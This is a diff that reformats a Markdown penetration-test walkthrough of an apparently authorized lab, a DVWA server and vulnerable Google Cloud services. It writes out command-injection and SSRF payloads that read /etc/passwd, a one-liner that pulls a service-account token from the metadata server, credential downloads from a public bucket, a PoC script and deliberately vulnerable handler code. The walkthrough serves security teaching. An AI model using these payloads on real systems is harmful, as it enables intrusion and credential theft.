@@ -33,19 +33,19 @@ In this article, I’ll walk you through a complete penetration test I conducted
 
 **What makes this walkthrough valuable?**
 
-- **Real-world scenario:**This is based on an actual penetration test, not a theoretical exercise
+- **Real-world scenario:** This is based on an actual penetration test, not a theoretical exercise
 
-- **Methodical approach:**You’ll see how each finding leads to the next discovery
+- **Methodical approach:** You’ll see how each finding leads to the next discovery
 
-- **Tool diversity:**We’ll use everything from basic`curl`commands to specialized tools like Burp Suite and sqlmap
+- **Tool diversity:** We’ll use everything from basic `curl` commands to specialized tools like Burp Suite and sqlmap
 
-- **Cloud focus:**Modern applications live in the cloud, and we’ll explore cloud-specific vulnerabilities
+- **Cloud focus:** Modern applications live in the cloud, and we’ll explore cloud-specific vulnerabilities
 
-- **Complete process:**From initial reconnaissance to final documentation
+- **Complete process:** From initial reconnaissance to final documentation
 
 Whether you’re a security professional looking to refine your methodology, a developer wanting to understand how attackers think, or someone preparing for security certifications, this walkthrough will provide valuable insights.
 
-**Important Disclaimer:**This penetration test was conducted on an authorized target in a controlled environment. Always ensure you have explicit written permission before testing any system. Unauthorized access to computer systems is illegal.
+**Important Disclaimer:** This penetration test was conducted on an authorized target in a controlled environment. Always ensure you have explicit written permission before testing any system. Unauthorized access to computer systems is illegal.
 
 [**AI-Assisted Web and Cloud Penetration Testing with Cursor + MCP HexStrike and Burp Suite MCP.**
 [A Complete Guide to Modern AI-Powered Security Testing. From One Prompt to Full Attack Surface Coverage (Recon →…](2026-01-31-ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp-01c02eed5258.md)
@@ -95,46 +95,43 @@ For this assessment, we’ll use a combination of open-source and commercial too
 
 **Reconnaissance:**
 
-- **Nmap:**The industry standard for port scanning and service enumeration
+- **Nmap:** The industry standard for port scanning and service enumeration
 
 [**Mastering Nmap: A Comprehensive Guide to Network Exploration and Security Auditing. Part 1**
 [This comprehensive post will delve into the powerful network scanning tool, Nmap, exploring its capabilities from basic…](../2024/2024-10-26-mastering-nmap-a-comprehensive-guide-to-network-exploration-and-security-auditing-part-1-f36d74d1b2c0.md)
 
-- **curl:**Simple but powerful for HTTP testing and API interactions
+- **curl:** Simple but powerful for HTTP testing and API interactions
 
 **Web Application Testing:**
 
-- **Burp Suite:**Professional web application security testing (Community Edition works fine)
+- **Burp Suite:** Professional web application security testing (Community Edition works fine)
 
 [**Mastering Burp Suite Vulnerability Scanner**
 [From configuration to result analysis, discover how to leverage Burp Suite’s automatic scanner for faster and more…](../2024/2024-11-11-mastering-burp-suite-vulnerability-scanner-019ed82c8bac.md)
 
-- **sqlmap:**Automated SQL injection testing
+- **sqlmap:** Automated SQL injection testing
 
 [**SQLMap: A Deep Dive into Automated SQL Injection Testing. Part 1. (basic, wizard)**
 [Learn how SQLMap transforms the landscape of database security by automating the detection and exploitation of SQL…](../2024/2024-11-04-sqlmap-a-deep-dive-into-automated-sql-injection-testing-part-1-basic-wizard-6dd540363c83.md)
 
 **Cloud Testing:**
 
-- **gcloud/gsutil:**Google Cloud Platform command-line tools (optional but helpful)
+- **gcloud/gsutil:** Google Cloud Platform command-line tools (optional but helpful)
 
 **General:**
 
-- **git:**For analyzing exposed repositories
+- **git:** For analyzing exposed repositories
 
-- **Python:**For parsing JSON and automating tasks
+- **Python:** For parsing JSON and automating tasks
 
 ## Setting Up Your Workspace
 
 Organization is crucial in penetration testing. Create a structured workspace:
 
 ```text
-mkdir
- -p ~/pt_workspace/target_name
-cd
- ~/pt_workspace/target_name
-mkdir
- -p {recon,exploits,proofs,reports}
+mkdir -p ~/pt_workspace/target_name
+cd ~/pt_workspace/target_name
+mkdir -p {recon,exploits,proofs,reports}
 ```
 
 This structure helps you:
@@ -151,7 +148,7 @@ This structure helps you:
 
 Burp Suite is invaluable for web application testing. Here’s a quick setup:
 
-- Start Burp Suite and configure the proxy to listen on`127.0.0.1:8080`
+- Start Burp Suite and configure the proxy to listen on `127.0.0.1:8080`
 
 - Configure your browser to use this proxy
 
@@ -170,10 +167,7 @@ Every successful penetration test begins with thorough reconnaissance. This phas
 Our first step is identifying what services are running on the target. I used Nmap to scan common ports:
 
 ```text
-nmap -sV -sC 
-34.121
-.
-191.196
+nmap -sV -sC 34.121.191.196
 ```
 
 **What this command does:**
@@ -185,31 +179,23 @@ nmap -sV -sC
 **Results:**
 
 ```text
-Nmap scan report 
-for
- 196.191.121.34.bc.googleusercontent.com (34.121.191.196)
+Nmap scan report for 196.191.121.34.bc.googleusercontent.com (34.121.191.196)
 Host is up (0.19s latency).
 Not shown: 995 filtered tcp ports (no-response)
 PORT     STATE  SERVICE    VERSION
 22/tcp   open   ssh        OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
 | ssh-hostkey: 
 |   3072 e6:1a:73:f8:15:e5:96:2c:1f:19:71:ef:0c:26:d3:03 (RSA)
-|   256 85:b6:63:3c:32:f0:41:45:30:4e:07:19:0b:9a:66:
-fc
- (ECDSA)
+|   256 85:b6:63:3c:32:f0:41:45:30:4e:07:19:0b:9a:66:fc (ECDSA)
 |_  256 16:48:70:bd:8a:5e:6b:37:ed:67:21:cc:0b:5b:c2:3c (ED25519)
 80/tcp   open   http       nginx 1.18.0
 | http-git: 
 |   34.121.191.196:80/.git/
 |     Git repository found!
-|     Repository description: Unnamed repository; edit this file 
-'description'
- to name the...
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
 |     Remotes:
 |       https://github.com/digininja/DVWA.git
-|_    Project 
-type
-: PHP application (guessed from .gitignore)
+|_    Project type: PHP application (guessed from .gitignore)
 |_http-server-header: nginx/1.18.0
 | http-title: Setup :: Damn Vulnerable Web Application (DVWA)
 |_Requested resource was /setup.php
@@ -219,40 +205,29 @@ type
 8080/tcp closed http-proxy
 8443/tcp closed https-alt
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap 
-done
-: 1 IP address (1 host up) scanned 
-in
- 28.13 seconds
+Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*yQH79-NxwEWy0Wp4L3XjpQ.png" alt="Article image" width="1185" height="685" loading="lazy" decoding="async" />
 
-**Initial Assessment:**The target is running a web server on port 80. This is our primary attack surface.
+**Initial Assessment:** The target is running a web server on port 80. This is our primary attack surface.
 
 ### DNS and Infrastructure Analysis
 
 Next, I performed reverse DNS lookup to identify the cloud provider:
 
 ```text
-host 
-34.121
-.191
-.196
-dig +
-short
- -x 
-34.121
-.191
-.196
+host 34.121.191.196
+dig +short -x 34.121.191.196
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*WGNqUfyzWea25AExS3Cxfw.png" alt="Article image" width="1062" height="120" loading="lazy" decoding="async" />
 
-**Key Finding:**The hostname`196.191.121.34.bc.googleusercontent.com`reveals this is hosted on**Google Cloud Platform**.
+**Key Finding:** The hostname `196.191.121.34.bc.googleusercontent.com` reveals this is hosted on **Google Cloud Platform**.
 
-**Why this matters:**Cloud environments often have additional attack surfaces:
+**Why this matters:** Cloud environments often have additional attack surfaces:
 
 - **Cloud Functions**
 
@@ -284,33 +259,25 @@ curl -I http://34.121.191.196/login.php
 
 - Server: nginx/1.18.0
 
-- Set-Cookie:`security=impossible`
+- Set-Cookie: `security=impossible`
 
 - Application appears to be PHP-based
 
-The`security=impossible`cookie was particularly interesting. This suggested the application might be**DVWA (Damn Vulnerable Web Application)**, a deliberately vulnerable web application used for security training.
+The `security=impossible` cookie was particularly interesting. This suggested the application might be **DVWA (Damn Vulnerable Web Application)**, a deliberately vulnerable web application used for security training.
 
 ### Confirming the Application Type
 
 I checked the page content to confirm:
 
 ```text
-curl -s http:
-//
-34.121
-.
-191.196
-/login.php | 
-grep
- -i 
-"dvwa\|damn\|vulnerable"
+curl -s http://34.121.191.196/login.php | grep -i "dvwa\|damn\|vulnerable"
 ```
 
-**Confirmed:**This is indeed DVWA.
+**Confirmed:** This is indeed DVWA.
 
-**The Challenge:**DVWA has a security level setting.**“Impossible”**means most intentionally vulnerable features are patched. However, this doesn’t mean the application is secure — it just means the intentional vulnerabilities are disabled.
+**The Challenge:** DVWA has a security level setting. **“Impossible”** means most intentionally vulnerable features are patched. However, this doesn’t mean the application is secure — it just means the intentional vulnerabilities are disabled.
 
-**My Strategy:**Instead of focusing on DVWA’s intentional vulnerabilities, I would look for:
+**My Strategy:** Instead of focusing on DVWA’s intentional vulnerabilities, I would look for:
 
 - Information disclosure
 
@@ -348,368 +315,56 @@ curl -s http://34.121.191.196/info.php
 
 ```text
 04:32:07 andrey@andrey-lab ~ → curl -s http://34.121.191.196/info.php
-<!DOCTYPE 
-html
->
-<
-html
->
-<
-head
->
-    
-<
-title
->
-Internal Services Information
-</
-title
->
-    
-<
-style
->
-        
-body
- { 
-font-family
-: Arial, sans-serif; 
-margin
-: 
-40px
-; 
-background
-: 
-#f5f5f5
-; }
-        
-.container
- { 
-background
-: white; 
-padding
-: 
-30px
-; 
-border-radius
-: 
-8px
-; 
-box-shadow
-: 
-0
- 
-2px
- 
-4px
- 
-rgba
-(
-0
-,
-0
-,
-0
-,
-0.1
-); }
-        
-h1
- { 
-color
-: 
-#333
-; }
-        
-.service
- { 
-margin
-: 
-20px
- 
-0
-; 
-padding
-: 
-15px
-; 
-background
-: 
-#e8f4f8
-; 
-border-left
-: 
-4px
- solid 
-#2196F3
-; }
-        
-.service
- 
-h3
- { 
-margin-top
-: 
-0
-; 
-color
-: 
-#1976D2
-; }
-        
-.url
- { 
-font-family
-: monospace; 
-background
-: 
-#f0f0f0
-; 
-padding
-: 
-5px
- 
-10px
-; 
-border-radius
-: 
-3px
-; 
-word-break
-: break-all; }
-        
-.warning
- { 
-color
-: 
-#d32f2f
-; 
-font-weight
-: bold; }
-    
-</
-style
->
-</
-head
->
-<
-body
->
-    
-<
-div
- 
-class
-=
-"container"
->
-        
-<
-h1
->
-Internal Services Information
-</
-h1
->
-        
-<
-p
->
-This page contains internal service URLs for development purposes.
-</
-p
->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Internal Services Information</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        .service { margin: 20px 0; padding: 15px; background: #e8f4f8; border-left: 4px solid #2196F3; }
+        .service h3 { margin-top: 0; color: #1976D2; }
+        .url { font-family: monospace; background: #f0f0f0; padding: 5px 10px; border-radius: 3px; word-break: break-all; }
+        .warning { color: #d32f2f; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Internal Services Information</h1>
+        <p>This page contains internal service URLs for development purposes.</p>
               
-        
-<
-div
- 
-class
-=
-"service"
->
-            
-<
-h3
->
-Cloud Function API
-</
-h3
->
-            
-<
-p
->
-Serverless function for processing requests:
-</
-p
->
-            
-<
-div
- 
-class
-=
-"url"
->
-https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40
-</
-div
->
-            
-<
-p
->
-<
-small
->
-Endpoints: ?cmd=, ?url=, ?env=, ?secret=
-</
-small
->
-</
-p
->
-        
-</
-div
->
+        <div class="service">
+            <h3>Cloud Function API</h3>
+            <p>Serverless function for processing requests:</p>
+            <div class="url">https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40</div>
+            <p><small>Endpoints: ?cmd=, ?url=, ?env=, ?secret=</small></p>
+        </div>
               
-        
-<
-div
- 
-class
-=
-"service"
->
-            
-<
-h3
->
-Cloud Run API Service
-</
-h3
->
-            
-<
-p
->
-Containerized API service:
-</
-p
->
-            
-<
-div
- 
-class
-=
-"url"
->
-https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app
-</
-div
->
-        
-</
-div
->
+        <div class="service">
+            <h3>Cloud Run API Service</h3>
+            <p>Containerized API service:</p>
+            <div class="url">https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app</div>
+        </div>
               
-        
-<
-div
- 
-class
-=
-"service"
->
-            
-<
-h3
->
-Storage Bucket
-</
-h3
->
-            
-<
-p
->
-Public storage bucket:
-</
-p
->
-            
-<
-div
- 
-class
-=
-"url"
->
-gs://vulnerable-bucket-39ca4c40
-</
-div
->
-        
-</
-div
->
+        <div class="service">
+            <h3>Storage Bucket</h3>
+            <p>Public storage bucket:</p>
+            <div class="url">gs://vulnerable-bucket-39ca4c40</div>
+        </div>
               
-        
-<
-hr
->
-        
-<
-p
->
-<
-a
- 
-href
-=
-"/"
->
-← Back to DVWA
-</
-a
->
-</
-p
->
-        
-<
-p
->
-<
-small
->
-Last updated: 2026-01-31 14:33:44
-</
-small
->
-</
-p
->
-    
-</
-div
->
-</
-body
->
-</
-html
->
+        <hr>
+        <p><a href="/">← Back to DVWA</a></p>
+        <p><small>Last updated: 2026-01-31 14:33:44</small></p>
+    </div>
+</body>
+</html>
 04:33:44 andrey@andrey-lab ~ → 
 ```
 
 **What I discovered:**
 
-The`info.php`file was a goldmine of information. It exposed:
+The `info.php` file was a goldmine of information. It exposed:
 
 ```text
 Cloud Function: https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40
@@ -727,17 +382,17 @@ Endpoints:
 
 **This was critical for several reasons:**
 
-- **Cloud services exposed:**The main application might be hardened, but cloud services often have different security postures
+- **Cloud services exposed:** The main application might be hardened, but cloud services often have different security postures
 
-- **Suspicious endpoints:**Parameters like`?cmd=`and`?url=`immediately raised red flags
+- **Suspicious endpoints:** Parameters like `?cmd=` and `?url=` immediately raised red flags
 
-- **Attack surface expansion:**Instead of one target, I now had multiple services to test
+- **Attack surface expansion:** Instead of one target, I now had multiple services to test
 
-**The Lesson:**Never underestimate information disclosure. A single exposed file can reveal an entire attack surface.
+**The Lesson:** Never underestimate information disclosure. A single exposed file can reveal an entire attack surface.
 
 ### Exposed .git Repository
 
-I also discovered the`.git`repository was accessible:
+I also discovered the `.git` repository was accessible:
 
 ```text
 curl -s http://34.121.191.196/.git/config
@@ -751,7 +406,7 @@ This revealed:
 
 - Potential access to source code and commit history
 
-**Why this matters:**Exposed`.git`repositories can leak:
+**Why this matters:** Exposed `.git` repositories can leak:
 
 - Source code
 
@@ -769,91 +424,53 @@ With cloud services identified, I pivoted my focus. The main application had sec
 
 ### Testing Command Injection
 
-The`?cmd=`parameter in the Cloud Function immediately caught my attention. I tested for command injection:
+The `?cmd=` parameter in the Cloud Function immediately caught my attention. I tested for command injection:
 
 ```text
-curl -s 
-"https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
+curl -s "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
 ```
 
-**Result:**`www-data`
+**Result:** `www-data`
 
-**Critical Vulnerability Confirmed!**The application was executing user-supplied commands without validation.
+**Critical Vulnerability Confirmed!** The application was executing user-supplied commands without validation.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*ufUPjRFFIpBpgbfj8X1MDQ.png" alt="Article image" width="1491" height="52" loading="lazy" decoding="async" />
 
 I escalated my testing:
 
 ```text
-# 
-Get
- 
-user
- ID
-curl 
--
-s "...?cmd=id"
-# 
-Result
-: uid
-=
-33
-(www
--
-data) gid
-=
-33
-(www
--
-data) 
-groups
-=
-33
-(www
--
-data)
-# Read 
-system
- files
-curl 
--
-s "...?cmd=cat+/etc/passwd"
-# 
-Result
-: 
-Full
- 
-/
-etc
-/
-passwd file contents
+# Get user ID
+curl -s "...?cmd=id"
+# Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# Read system files
+curl -s "...?cmd=cat+/etc/passwd"
+# Result: Full /etc/passwd file contents
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*Bs12jeJnrsLaPxf0fsl38g.png" alt="Article image" width="1612" height="545" loading="lazy" decoding="async" />
 
 **Impact Assessment:**
 
-- **Remote Code Execution (RCE):**Complete control over the Cloud Function execution environment
+- **Remote Code Execution (RCE):** Complete control over the Cloud Function execution environment
 
-- **File System Access:**Ability to read sensitive files
+- **File System Access:** Ability to read sensitive files
 
-- **Potential for Privilege Escalation:**Depending on the service account permissions
+- **Potential for Privilege Escalation:** Depending on the service account permissions
 
-- **Lateral Movement:**Potential to access other cloud resources
+- **Lateral Movement:** Potential to access other cloud resources
 
 ### Testing SSRF (Server-Side Request Forgery)
 
-The`?url=`parameter suggested SSRF vulnerability. I tested it:
+The `?url=` parameter suggested SSRF vulnerability. I tested it:
 
 ```text
 # Test local file reading
-curl -s 
-"...?url=file:///etc/passwd"
+curl -s "...?url=file:///etc/passwd"
 ```
 
-**Result:**Successfully read`/etc/passwd`via the`file://`protocol.
+**Result:** Successfully read `/etc/passwd` via the `file://` protocol.
 
-**SSRF Confirmed!**This vulnerability allows:
+**SSRF Confirmed!** This vulnerability allows:
 
 - Reading local files
 
@@ -867,29 +484,26 @@ curl -s
 
 ### Exposing Environment Variables and Secrets
 
-The`?env=`and`?secret=`parameters were too tempting to ignore:
+The `?env=` and `?secret=` parameters were too tempting to ignore:
 
 ```text
 # Get all environment variables
-curl -s 
-"...?env=1"
- | python3 -m json.tool
+curl -s "...?env=1" | python3 -m json.tool
 # Get secret key directly
-curl -s 
-"...?secret=1"
+curl -s "...?secret=1"
 ```
 
 **Critical Findings:**
 
-- **SECRET_KEY exposed:**`exposed-secret-39ca4c40`
+- **SECRET_KEY exposed:** `exposed-secret-39ca4c40`
 
 <img src="https://cdn-images-1.medium.com/max/800/1*AtMB-F8i_IQt-b3bucplXQ.png" alt="Article image" width="1686" height="60" loading="lazy" decoding="async" />
 
-- **All environment variables leaked:**Including project details, paths, service names
+- **All environment variables leaked:** Including project details, paths, service names
 
-- **Configuration information:**Complete application configuration
+- **Configuration information:** Complete application configuration
 
-**Why this is critical:**Exposed secrets can lead to:
+**Why this is critical:** Exposed secrets can lead to:
 
 - Session hijacking
 
@@ -918,22 +532,19 @@ One of the most powerful capabilities in cloud environments is accessing the met
 I attempted to access it via command injection:
 
 ```text
-curl -s 
-"...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token['access_token'])"
+curl -s "...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token['access_token'])"
 ```
 
-**Result:**Successfully obtained a GCP access token!
+**Result:** Successfully obtained a GCP access token!
 
-**Note:**In some cases, the metadata service might return 403 Forbidden, which is actually good security practice. However, in this case, access was possible.
+**Note:** In some cases, the metadata service might return 403 Forbidden, which is actually good security practice. However, in this case, access was possible.
 
 ## Enumerating Cloud Resources
 
 With an access token, I could now enumerate GCP resources using the GCP APIs:
 
 ```text
-TOKEN
-=
-"<access_token>"
+TOKEN="<access_token>"
 ```
 
 ```text
@@ -956,11 +567,11 @@ curl -H "Authorization: Bearer $TOKEN" \
 
 **Key Discoveries:**
 
-- **Publicly accessible storage bucket:**`vulnerable-bucket-39ca4c40`
+- **Publicly accessible storage bucket:** `vulnerable-bucket-39ca4c40`
 
-- **Overprivileged service account:**With`roles/owner`(full project access)
+- **Overprivileged service account:** With `roles/owner` (full project access)
 
-- **Multiple cloud services:**Cloud Functions, Cloud Run, Storage
+- **Multiple cloud services:** Cloud Functions, Cloud Run, Storage
 
 This enumeration revealed the true scope of the security issues.
 
@@ -973,19 +584,18 @@ The discovery of a publicly accessible storage bucket was a major finding. Let�
 I tested if the bucket was truly public:
 
 ```text
-curl -s 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
+curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
 ```
 
-**Result:**XML listing showing all files in the bucket, including:
+**Result:** XML listing showing all files in the bucket, including:
 
 <img src="https://cdn-images-1.medium.com/max/800/1*4_WVy0xhv0kXdEha69JwLQ.png" alt="Article image" width="1917" height="122" loading="lazy" decoding="async" />
 
-- `function-code.zip`(Cloud Function source code)
+- `function-code.zip` (Cloud Function source code)
 
-- `secrets/database-credentials.json`(Sensitive credentials)
+- `secrets/database-credentials.json` (Sensitive credentials)
 
-**Critical Misconfiguration:**The bucket had no access controls, allowing anyone to list and download files.
+**Critical Misconfiguration:** The bucket had no access controls, allowing anyone to list and download files.
 
 ### Downloading Sensitive Files
 
@@ -993,17 +603,9 @@ I downloaded the exposed files:
 
 ```text
 # Download database credentials
-curl -s 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
+curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
 # Download function source code
-curl -s 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip"
- -o 
-function
--
-code
-.
-zip
+curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip" -o function-code.zip
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*qmRb0dI1r4yUPG1v_av1tg.png" alt="Article image" width="1904" height="60" loading="lazy" decoding="async" />
@@ -1014,99 +616,43 @@ zip
 
 ```text
 {
-  
-"api_key"
-:
- 
-"stripe_live_example_39ca4c40"
-,
-  
-"db_host"
-:
- 
-"internal-db-39ca4c40"
-,
-  
-"db_password"
-:
- 
-"EXAMPLE_PASSWORD_123!"
-,
-  
-"db_user"
-:
- 
-"admin"
+  "api_key": "stripe_live_example_39ca4c40",
+  "db_host": "internal-db-39ca4c40",
+  "db_password": "EXAMPLE_PASSWORD_123!",
+  "db_user": "admin"
 }
 ```
-
 **Critical Impact:**
 
-- **Database credentials:**Direct access to the database
+- **Database credentials:** Direct access to the database
 
-- **API keys:**Potential for unauthorized API access
+- **API keys:** Potential for unauthorized API access
 
-- **Source code:**Complete Cloud Function source code revealing all vulnerabilities
+- **Source code:** Complete Cloud Function source code revealing all vulnerabilities
 
 ### Analyzing the Source Code
 
 Extracting and analyzing the function source code confirmed the vulnerabilities I had already discovered and revealed the exact implementation:
 
 ```text
-def
- 
-vulnerable_handler
-(
-request: Request
-):
+def vulnerable_handler(request: Request):
+    # SSRF vulnerability - no validation
+    if 'url' in request.args:
+        url = request.args.get('url')
+        response = urllib.request.urlopen(url, timeout=5)
+        return response.read().decode('utf-8')
     
-# SSRF vulnerability - no validation
-    
-if
- 
-'url'
- 
-in
- request.args:
-        url = request.args.get(
-'url'
-)
-        response = urllib.request.urlopen(url, timeout=
-5
-)
-        
-return
- response.read().decode(
-'utf-8'
-)
-    
-    
-# Command injection vulnerability
-    
-if
- 
-'cmd'
- 
-in
- request.args:
-        
-import
- subprocess
-        cmd = request.args.get(
-'cmd'
-)
-        result = subprocess.run(cmd, shell=
-True
-, ...)  
-# ⚠️ shell=True!
-        
-return
- result.stdout
+    # Command injection vulnerability
+    if 'cmd' in request.args:
+        import subprocess
+        cmd = request.args.get('cmd')
+        result = subprocess.run(cmd, shell=True, ...)  # ⚠️ shell=True!
+        return result.stdout
 ```
 
 **The Code Tells the Story:**
 
-- `shell=True`in`subprocess.run()`enables command injection
+- `shell=True` in `subprocess.run()` enables command injection
 
 - No URL validation allows SSRF
 
@@ -1123,17 +669,11 @@ While the cloud services had critical vulnerabilities, I also conducted thorough
 Even though DVWA’s security level was “impossible,” I tested for SQL injection:
 
 ```text
-sqlmap -u 
-"http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit"
- \
-  
---cookie="security=low; PHPSESSID=<session_id>" \
-  
---batch \
-  
---level=5 \
-  
---risk=3
+sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=<session_id>" \
+  --batch \
+  --level=5 \
+  --risk=3
 ```
 
 **Key Points:**
@@ -1144,19 +684,19 @@ sqlmap -u
 
 - Documented results even if not exploitable (security level “impossible”)
 
-**The Lesson:**Always test thoroughly, even when initial indicators suggest vulnerabilities are patched. Sometimes real-world applications have vulnerabilities that training applications don’t.
+**The Lesson:** Always test thoroughly, even when initial indicators suggest vulnerabilities are patched. Sometimes real-world applications have vulnerabilities that training applications don’t.
 
 ### Burp Suite Analysis
 
 I used Burp Suite for comprehensive web application testing:
 
-- **Proxy Interception:**Captured all HTTP requests and responses
+- **Proxy Interception:** Captured all HTTP requests and responses
 
-- **Repeater:**Manually tested suspicious endpoints
+- **Repeater:** Manually tested suspicious endpoints
 
-- **Intruder:**Fuzzed parameters for hidden vulnerabilities
+- **Intruder:** Fuzzed parameters for hidden vulnerabilities
 
-- **Scanner:**Automated vulnerability detection
+- **Scanner:** Automated vulnerability detection
 
 **What Burp Revealed:**
 
@@ -1168,7 +708,7 @@ I used Burp Suite for comprehensive web application testing:
 
 - Additional endpoints not visible in normal browsing
 
-**Why Burp is Essential:**It provides visibility into the application’s behavior that simple`curl`commands cannot.
+**Why Burp is Essential:** It provides visibility into the application’s behavior that simple `curl` commands cannot.
 
 ## Phase 8: Documentation and Reporting
 
@@ -1215,19 +755,10 @@ I created reproducible PoC scripts:
 ```text
 #!/bin/bash
 # Command Injection PoC
-FUNCTION_URL=
-"https://...cloudfunctions.net/vulnerable-function-39ca4c40"
-echo
- 
-"Testing Command Injection..."
-curl -s 
-"
-$FUNCTION_URL
-?cmd=whoami"
-curl -s 
-"
-$FUNCTION_URL
-?cmd=id"
+FUNCTION_URL="https://...cloudfunctions.net/vulnerable-function-39ca4c40"
+echo "Testing Command Injection..."
+curl -s "$FUNCTION_URL?cmd=whoami"
+curl -s "$FUNCTION_URL?cmd=id"
 ```
 
 These scripts allow:
@@ -1256,17 +787,17 @@ A comprehensive report included:
 
 **Report Structure:**
 
-- **Executive Summary:**High-level overview for management
+- **Executive Summary:** High-level overview for management
 
-- **Methodology:**How the test was conducted
+- **Methodology:** How the test was conducted
 
-- **Findings:**Detailed vulnerability descriptions
+- **Findings:** Detailed vulnerability descriptions
 
-- **Proofs:**Evidence for each finding
+- **Proofs:** Evidence for each finding
 
-- **Recommendations:**Prioritized remediation steps
+- **Recommendations:** Prioritized remediation steps
 
-- **Appendix:**Tools used, commands executed, references
+- **Appendix:** Tools used, commands executed, references
 
 ## Key Lessons and Takeaways
 
@@ -1274,9 +805,9 @@ This penetration test revealed several important lessons:
 
 ### 1. Information Disclosure is Critical
 
-The`info.php`file was the key that unlocked everything. It's easy to overlook information disclosure, but it can be devastating.
+The `info.php` file was the key that unlocked everything. It's easy to overlook information disclosure, but it can be devastating.
 
-**Best Practice:**Regularly audit your applications for:
+**Best Practice:** Regularly audit your applications for:
 
 - Debug endpoints
 
@@ -1310,7 +841,7 @@ Multiple layers of security would have prevented or limited the impact:
 
 - Secret management would prevent credential exposure
 
-**Best Practice:**Implement multiple security controls. If one fails, others provide protection.
+**Best Practice:** Implement multiple security controls. If one fails, others provide protection.
 
 ### 4. Source Code Exposure Amplifies Risk
 
@@ -1322,7 +853,7 @@ Exposed source code makes it easier for attackers to:
 
 - Craft targeted exploits
 
-**Best Practice:**Never expose source code in production. Use proper deployment processes.
+**Best Practice:** Never expose source code in production. Use proper deployment processes.
 
 ### 5. Methodical Testing Wins
 
@@ -1336,7 +867,7 @@ This test succeeded because of methodical, systematic testing:
 
 - Verified all findings
 
-**Best Practice:**Follow a structured methodology. Don’t skip steps.
+**Best Practice:** Follow a structured methodology. Don’t skip steps.
 
 ## Common Pitfalls and How to Avoid Them
 
@@ -1344,19 +875,19 @@ Based on this assessment, here are common mistakes and how to avoid them:
 
 ### Mistake 1: Assuming Security Level Means Security
 
-**The Error:**Assuming “security level impossible” means the application is secure.
+**The Error:** Assuming “security level impossible” means the application is secure.
 
-**The Reality:**Security levels in training applications don’t reflect real-world security. Always test thoroughly.
+**The Reality:** Security levels in training applications don’t reflect real-world security. Always test thoroughly.
 
-**How to Avoid:**Test all endpoints regardless of security settings. Look for real-world vulnerabilities, not just training vulnerabilities.
+**How to Avoid:** Test all endpoints regardless of security settings. Look for real-world vulnerabilities, not just training vulnerabilities.
 
 ### Mistake 2: Ignoring Information Disclosure
 
-**The Error:**Focusing only on exploitable vulnerabilities, ignoring information leaks.
+**The Error:** Focusing only on exploitable vulnerabilities, ignoring information leaks.
 
-**The Reality:**Information disclosure often leads to exploitable vulnerabilities.
+**The Reality:** Information disclosure often leads to exploitable vulnerabilities.
 
-**How to Avoid:**Always check for:
+**How to Avoid:** Always check for:
 
 - Debug endpoints
 
@@ -1368,43 +899,43 @@ Based on this assessment, here are common mistakes and how to avoid them:
 
 ### Mistake 3: Not Testing Cloud Services Separately
 
-**The Error:**Assuming cloud services inherit security from the main application.
+**The Error:** Assuming cloud services inherit security from the main application.
 
-**The Reality:**Each service has its own security posture.
+**The Reality:** Each service has its own security posture.
 
-**How to Avoid:**Test each service independently. Review cloud configurations regularly.
+**How to Avoid:** Test each service independently. Review cloud configurations regularly.
 
 ### Mistake 4: Poor Documentation
 
-**The Error:**Not documenting findings as you go.
+**The Error:** Not documenting findings as you go.
 
-**The Reality:**You’ll forget details, and reports are harder to write later.
+**The Reality:** You’ll forget details, and reports are harder to write later.
 
-**How to Avoid:**Document everything immediately. Save outputs, take screenshots, create PoC scripts.
+**How to Avoid:** Document everything immediately. Save outputs, take screenshots, create PoC scripts.
 
 ## Learning Resources
 
-- **OWASP Top 10:**Essential web vulnerabilities
+- **OWASP Top 10:** Essential web vulnerabilities
 
-- **PTES (Penetration Testing Execution Standard):**Methodology framework
